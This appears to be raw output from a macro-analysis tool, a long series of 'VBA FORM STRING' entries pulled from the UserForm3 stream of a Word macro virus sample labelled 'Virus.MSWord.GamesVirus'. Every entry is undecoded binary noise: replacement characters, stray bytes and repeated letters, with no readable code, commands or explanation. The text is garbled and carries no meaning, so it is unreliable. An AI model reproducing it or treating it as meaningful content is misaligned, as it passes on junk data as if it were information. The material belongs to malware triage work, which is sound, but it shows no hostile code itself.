VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��n�fcg\bh�����w���ff�����������wfffffcw�}����l{^baYymmo|p|�Y�{l�vga���ԛu����ӦԸ�����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������3�������ӧ����Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ƚ��r�z��������Ć��z����quoq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tWqoomym/m/omoqoVommym/myyZZZZyyZZjjjjQQQQQjjZZ�Zjj�Z�QjZZZyZyZy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fwffw����wiUQQenfwff���fnff���������ffffwfy���~r�bk���|��|��ker{r�k���������踸��Ը�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wq�u�t�MM��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��qͧ�Ӭӷ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������řZz~z����Ǌ��ɯ�ą�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���uo�w���oyyjj�QjZjjQQ�j�YUYUYUUYYaYaaaYaaaa^^_^baa^^aaS^^a^S^a^a^aaa__aaa^^aaaaaY��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nwffffwnf�����heh\ccnff��w\dd�����w��fwwwwp�����svvl{`[\]R\\]{[d[f\is������«�����ӧ���f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E/�Woo���է����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qt���˳�o�~kZ��Ϋ������ɿ�����������ΗQ�YYYaaSa^YYYYYYY�YYYaaSaSaa^^__k__^__bb_^aa^^^^bbDbbb_____kRHRRrrkkkerkRRkRkk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
prdnccwffwwcn���ffnnnnncf���fdg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lf��wdf������}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������j�Ya{{`{���p~�����Թ����������Wq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zyo�캨������q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
to����ʶ���a������ɼ~����γ��î��ɿƔYYYaYYaaaSSSYaaYaaaaYaYYYYaYY�}�YaaaaDaaaaaaaaD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kk_DDkReRRR{````
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rHkkkR_k_^k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��wnvlccnwnwwcfffffwwcccncnf���ffwnwf�wcn�w���}���������Ӧ���楥Z}}����dc�䫤��vcv�~����i\cfd�qaq�������婩�����q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�鯮����ȭ�����ɩ�}��������������ɚUUjjQQ�Q�UQjjUQQjQ�jQUjU�QU�QQQQQ��U��U�Q��Ya^aaaaaa�^^aa^^^_r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�����w�didnwnwffffffff\\Ccfwf���f��w\dnffw������ԥ�U�}UZmo�uuqq�y������Ӊ������������~�~�iccv�判��Ը�天s���庫���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tqq���ɿɯ������Τ���������š��ɿǥyZZy/moqooomyyZZm/ymyyyymBm/mmmyyyyjZZZZZZZZZZyyZZjZjQjjZZQQjZZZjjjjjQQUUUU�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
affffff����n�scnwfffcdwffc[R`cf���ffff���ffcn�������wfwwnff cw�fff������䤩���������������~l�������Ӧ��d��������Ӧ�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qjmom���������ɯǷ�Y^RaU���ZZZZmymyyymymymooqqqqt������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tmmmyZymomommqqqoqqqmVomoooymmmymmmmZZZZZZZjZZymmymmy/ymmmZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
acffffcffffff��nvcff��fffc[iww�ff����ff�����������ӡw�dn\C@7ACdwvw��������夸�������ԥ��������o�判�����}�`leer�}��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ZYoooWtttMq�ZY�a��ZZymmmymomoVooVoqWWqWqqqqq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tooVooommmmooqqqqqqmqqoooommyymmyymyy/mZyZZ/mmmmyym/oyZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�arwffffwwncnfffffffwffffffwfff�������ff������w�nf�v�~~���}���~~���������������嫬��������~�`r~�����r`d~l~����~lhh/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����y}ymoWWtqVVmZR^joVyoymommmmVqWWttWWttMtttt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�����ԧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tWWWqqqqWWqqooVVqqqqqVVVqqqqooooooommomommyZ/m/mmyy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tq�VVVmaa{fnnnwnvcffffffffff�fffnf�����f������������~�ez��Z�Z���~����ͬ����������}r~s���~�iffhl�����奨������r[\\\/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������mVuuqVmjUZymoVqWWqtuWuuttqWuWWWWWu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����WWuWtuWWWuttWWWWWWttttttttqWWWqVPmoqWqqommmoooqoy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|��p|�FW�W�mbr`vcwf���fffw�����fwfn����������f���s~����������~s������幹������rcdz~����~nc����Ӧ����}�^k`{g~gi~�v/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������oWumZammmqtWutuWqoVmmm/Qjoqy/Z�鵸������ӳw}�q浵qqoqWWWqWqWWWtttuWWttM�ttttt�tttWqWWtWW3qVqWWVqmo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�|��|||������ooW�|��~l{dwwffn�wwf��ffcic\nf�fwff����~��z�z�}�esn�������~�����������Ө�������s�s��}l�~�~li\fffffw�/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͕�������������������������mqqWWqmp^yWqWo�������॥���q�~a�a}��WZmym/moyomomVoqqWtWWWWWWWWWWttttMttttttMttttuWuu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qypYpoy�y���tWq��uZ|o�qVy��k\f�wfw���f�fff�cnwwww��w�~sv��l`~s��d~�brhc������Ժ���}���Ӻ�������ar`^blvlcffwnf�dcfd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����͵����͛����������������������������������������s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����o�oquWuVVoZZYYYUZZmmVooVVVVqqqq3qqqWWuWWWtMttWMWtttttu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qZoWooomZ��|��WVmWWu�q�q|�����VVZY{nwwfw�fff�fffn�wf}�w��w�fnc���lr^��~��������ӹ�����ӫ�ӻ�Ԧӌs���v�ff��~vdcffff�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������������͓�ͳ������������ವǓ������������q�ymmqWWWqj�M����t/QZmmmyy/mmqqWWqWWtttutttuuuWu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�YyoVWqVVq�mZZm�pZ�o|�m|Vm|�|��q�|}�s����ffwcff����W�ot�qqu��^dlnn�ss����~��Ը��Ӹ�註��Ԥ���lvvhvdwwcccfcfcf�fd/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�������������������Ŝ�������Ӧӧ��Ӟ���������͵����������;�������������oZ������酧�ZYaYUQZ�Z/ommymmoooqqWq3WWq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�azz�ooqWWqVVVoZ�ooZmmmZ��pm�o����|||��m�����n�fff�ncaW����~}�q�lff�dnkr~}�v�쨸��������}���~z��vh�vwwf����ww�����d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o��͢��űͧ��Ţ����������������ͳ��������鷳鶅�����������౳����������������������Wy��WWVoZjY��YUj�jm/mmZmmmyyoqq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��wfnwcvv�`~r�Ybaa�kjZjjy�mVmjZZmm��V�V�qWq�W���V~n�ff��w�n�����fwfdv���������~s��죈�~��~��c��ff��fwccwnv��fnn�^}��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ͦ�������������������t�t�����tu����ж酶��������������ͳ������͛��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������RmoquttqqVVmZa^k_YYZZyqooomo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cnnnffffffwfcnnn���v�vllerrrkrr�leVmqVWmop|jo|qq��{n��fcffwwn�fwd��e��妻������irvcncffnffffww�nncnwn�v{hSY{`v��v�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������u��uqqqqqqy����������������������������������൵�����������������j/mVquuuWooomjaYa^Yjmmoyy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�ww��ccvc���w�nfwnwnnccncccccn���flsdw�~blZZ�WZZ||Wq�fw�cfffwc�����~����{kilnccw�n�fnvc�cci�pU�vc�YY�}b�{_�aaa`H``y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������鳳����������tq���qyyyomoy����酶�������������鳛����������ಳ�ű���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������qaymZ���wYt3VVoYYaaQjyyy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ywffwf���wwfwww��n�nnncnww�ncvn���������wf�wwffncc}r}jw����v��v~�����vwcnw�fncgc`i�gk}��vr{l`{r`^^_c`v�ffnccn`rw���d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������ooͶ��yyyyZZZZm�����������������������������������͵��������������WbZojYV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tyj_ejmoommm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
afwdvnfwffnccnfffffffff�ffwnnfdvnfffffwvnnf��nncc�wf\f`ic�ns��y�h����l�{{rdllvllnv����w�w�v�����nnc]`r]\{h�c}cdfccQro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������oy�鳧�ZmZZZZZyZZq�������������������������������������ಕ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������q�ZooE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YaaZoZomqquq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}fcccdv�깻��Zaick_^hvwr`\{i]]��Z~�fvvs�r�el~������ffcff����q�����q�����Ӹ���������������������~�wi`iYfriijYZc_wvcvdq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������ttVVqoq������������鵕��ZZjZZZZZ����������������������t�����������������鵓��������������EN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NLu���������Ŭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
afc�f[w�q�ut��pHOBQB`LpmHR^qmpj^hhf�hnda�wrY�y����ffff�dqq���������q��즺�����Ӈ�s��qjZa�������zdH`UZcSYvpV]{icv�sy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������uuqVoqqoq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鵓���q������Zj�ZZ��ZjZ������������鳆��t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t�����酅���ӵ�酆�����Wqt�Et�����������ͳ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q^HW3ow�n�q���S{F*]SSIZZcY3jV^[iviUValHXH]lk���n������f��q����q�������q�Ӧ䤨�qo�nfrc^`h]v���¿��f`YO_R[Ui
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jp^l���w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����q��qWooooo���������o�����ZjZZZZZ��Zj|mZ������q������������������tu�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������WquqmVVqPPPW����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tVW`�ov���t�qV�lZRNpQZHT/Y_hHi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XZPlSRMYcw����逸��������r���q�������q������o��vQRi^Ypi���Ө��sgwS`Udr~drZp|afn}�dZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�靶�����ooVoyy��������VVVVmmmoVVmyyZZZZZjZZ�������������quttuuWWWWWWWW�����鶅�����������qoVVVPqqt�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wtq/t����W���qmp�Y__|OUigp/mUURWZummWURi_{~Z�����W�y�弼�qtl�������yo����q칠���vwfViUpXP_�wf��f�hw_rU`�obvjbZZ~��sqq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��鷶���tWVoomm/m������qqqWVooqVqom/ZZjjjjj|�y��������oZmmoqqqqqqqqqVq���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ymomoqqo����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YRtWj����ZmVVjkO5L2pOf]\UWBQQ\S+QZ_SH]\iaf�s��������������l�z��������o����������fvznli^r��妻��~r�i^Oghvf[omql�����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t����qWWqqqqoqqWq3WWqWqVVqqqqooyZZjjjj||�|��������������m/moVooVqqqVoq�������������������quWWWuu��t���t�������tt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uc^�������omS]p992+h�c`ZmIYifQ/H`_SR\f^Yvqm��������������nY~��~�Ӣ���妺��������nXllpl{cccs����}����������������եey
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������qtqqWq3qqVVooqqqqqqqqqVqoommZ�ZZ�|���}}}������������ooVoVqoVVooooo�������������������tutuuWtu��q��������u��t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q+Z�������mZj\ZBU^HY��aWkjZc�ULS[[\ccccWVsoyn�������������dd���������������ӳ�����f����mh}}�����}vn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����ۡ��������dy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����q���qqqqqVVooooooqooqVooooyZp�j�YU�}}}�}�}���������WWWqqWq3Vqooooo�����������酝��൶uttuutW��������������tt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WmpImcfwv`P{hYKNH`iRc^Zj_S^f\QY]\cccceWmjlyZv�������������nm���n�q��������ӹ�������f�djgPhv�����~acd[OQHRSYpWVVc�v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����uuWWq3VqoooooyyymooVooommmm�������}���}����}}����������WWWuWqqqqqoooo�������t�����t�����tttutuWqqqq������������
-------------------------------------------------------------------------------
